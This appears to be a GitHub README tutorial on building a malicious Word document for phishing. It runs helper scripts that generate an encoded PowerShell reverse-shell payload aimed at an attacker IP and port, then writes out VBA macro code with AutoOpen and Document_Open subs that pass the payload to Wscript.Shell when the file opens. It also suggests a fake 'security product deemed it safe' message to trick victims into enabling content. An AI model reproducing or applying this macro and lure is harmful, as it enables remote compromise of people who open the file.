# Creating-a-Malicious-doc

As we know that how important documents are in a company. We can create a malicious macro using MS Word which leads to create a doc file contain our malicious code, if any user open that doc file the payload triggred and attacker gets a reverse shell. Phishing is the best way to send someone a malicious document.

# Exploitation

### Generate a powershell base64 encoded payload using [newpayloadgeneration.py](https://github.com/k4sth4/Creating-a-Malicious-doc/blob/main/newpayloadgeneration.py)

```markdown
python3 newpayloadgeneration.py 192.168.x.x 443 
```

![OnPaste 20220610-124634](https://user-images.githubusercontent.com/106917304/173011432-8c463a51-ec99-43a9-8b89-b6211a5b58df.png)


### Using [payload.py](https://github.com/k4sth4/Creating-a-Malicious-doc/blob/main/payload.py) to get Shellcode

copy that payload and paste the code on another [payload.py](https://github.com/k4sth4/Creating-a-Malicious-doc/blob/main/payload.py) python script, then run payload.py and get shellcode which we gonna copy and use it on MS Word macro. 

![OnPaste 20220610-125130](https://user-images.githubusercontent.com/106917304/173012315-35773388-26ce-46af-be5a-51be09bd5d3b.png)


```markdown
python3 payload.py
```

![OnPaste 20220610-125234](https://user-images.githubusercontent.com/106917304/173012565-ff31eac9-2d6b-48aa-96ec-47f2c22bd922.png)


### Creating a Macro using MS Word

Now open MS Word goto View --> choose Macro --> open macro --> create a macro, name it MyMacro --> choose option Macros in: Document1(document)

![OnPaste 20220610-125805](https://user-images.githubusercontent.com/106917304/173013461-6408bd9a-1c37-4db2-890e-f6684fa49b83.png)


We need macro language to create a malicious macro.
```markdown
Sub AutoOpen() 

MyMacro 

End Sub 

Sub Document_Open() 

MyMacro 

End Sub 

Sub MyMacro() 

    Dim Str As String 

    Str = Str + "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAt" 
    Str = Str + "AE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAF" 
    .
    .
    .
    
    
    CreateObject("Wscript.Shell").Run Str 
    
    
    End Sub 
```

Copy and paste that encoded shellcode as shown.


![OnPaste 20220610-130325](https://user-images.githubusercontent.com/106917304/173014460-978bd7d2-ba8d-460a-bc6e-64b859c68d9f.png)


![OnPaste 20220610-130348](https://user-images.githubusercontent.com/106917304/173014522-4be0bd4e-f19c-48b1-beef-3907617d82a4.png)


NOTE: I'll give my doc name project.doc and remember to choose save type as Word 97-2003 Document. 


For this to work user must click on Enable Content, in real world usually saying something along the lines of "Security product XYZ has scanned the content and deemed it to be safe.

